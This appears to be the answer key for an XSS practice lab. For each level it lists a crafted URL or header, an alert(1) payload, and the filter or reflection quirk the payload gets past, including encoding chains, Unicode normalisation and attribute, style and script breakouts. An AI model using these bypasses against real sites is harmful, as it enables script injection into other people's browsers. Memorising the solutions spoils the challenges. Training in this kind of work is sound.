# realworld — solutions

Real-world reflection patterns: double sinks, debug flags, truncation, headers, encoding chains.

### realworld-level1

`/realworld/level1/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: safe in HTML comment but raw in <h2> body

### realworld-level2

`/realworld/level2/?query=%3Csvg%20onload%3Dalert(1)%3E&debug=1`

- payload: `<svg onload=alert(1)>`
- context: only reflected when debug=1

### realworld-level3

`/realworld/level3/?query=%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: truncated to 30 chars; fits

### realworld-level4

`/realworld/level4/?tag=svg&attr=onload%3Dalert(1)`

- payload: tag=`svg`, attr=`onload=alert(1)`
- context: <TAG ATTR>content</TAG> multi-param construction

### realworld-level5

`/realworld/level5/?%3Csvg%20onload%3Dalert(1)%3E`

- payload: `<svg onload=alert(1)>` as the parameter key itself
- context: parameter key names reflected to body

### realworld-level6

`/realworld/level6/?query=%3Cscript%3Ealert(1)%3C%2Fscript%3E`

- payload: `<script>alert(1)</script>`
- context: response Content-Type text/plain; browsers may sniff (legacy IE/Chrome no-sniff disabled)

### realworld-level7

`/realworld/level7/?query=%5C%27%3Balert(1)%2F%2F`

- payload: `\';alert(1)//`
- context: JS '..' string, only ' escaped (not \); `\\'` leaves quote

### realworld-level8

`[Header] /realworld/level8/`

- payload: `<svg onload=alert(1)>`
- header: `Referer: <svg onload=alert(1)>`
- context: Referer header reflected raw in body

### realworld-encoding-level1

`/realworld-encoding/level1/?query=%25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E`

- payload (final): `<script>alert(1)</script>` (triple-URL-encoded)
- context: 3x URL decode; first two decoded states must not contain literal < >

### realworld-encoding-level2

`/realworld-encoding/level2/?query=%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C%2Fscript%EF%BC%9E`

- payload: `＜script＞alert(1)＜/script＞` (fullwidth < and >)
- context: literal < > blocked, then NFKC normalises fullwidth to ASCII

### realworld-encoding-level3

`/realworld-encoding/level3/?query=%26lt%3Bsvg%20onload%26%2361%3Balert%26%2340%3B1%26%2341%3B%26gt%3B`

- payload: `&lt;svg onload&#61;alert&#40;1&#41;&gt;`
- context: single-pass entity decode → `<svg onload=alert(1)>` rendered

### realworld-encoding-level4

`/realworld-encoding/level4/?query=JTNDc3ZnJTIwb25sb2FkJTNEYWxlcnQlMjgxJTI5JTNF`

- payload (decoded): `<svg onload=alert(1)>`
- context: server base64-decodes then URL-decodes; encode payload URL→base64

### realworld-encoding-level5

`/realworld-encoding/level5/?query=red%22%3E%3Csvg%20onload%3Dalert(1)%3E`

- payload: `red"><svg onload=alert(1)>`
- context: style="color: QUERY" attribute breakout

### realworld-encoding-level6

`/realworld-encoding/level6/?query=red%7D%3C%2Fstyle%3E%3Csvg%20onload%3Dalert(1)%3E`

- payload: `red}</style><svg onload=alert(1)>`
- context: inside <style>body{background: QUERY}; close style

### realworld-encoding-level7

`/realworld-encoding/level7/?query=%253C%252Ftext%253E%253Csvg%2520onload%253Dalert(1)%253E`

- payload (after server URL-decode): `</text><svg onload=alert(1)>`
- context: pre-check on raw query (no < >), then decoded into <svg><text>

### realworld-encoding-level8

`/realworld-encoding/level8/?query=%3C%2Fscript%3E%3Csvg%20onload%3Dalert(1)%3E`

- payload: `</script><svg onload=alert(1)>`
- context: JSON-string escaped quotes/backslash but not </script>
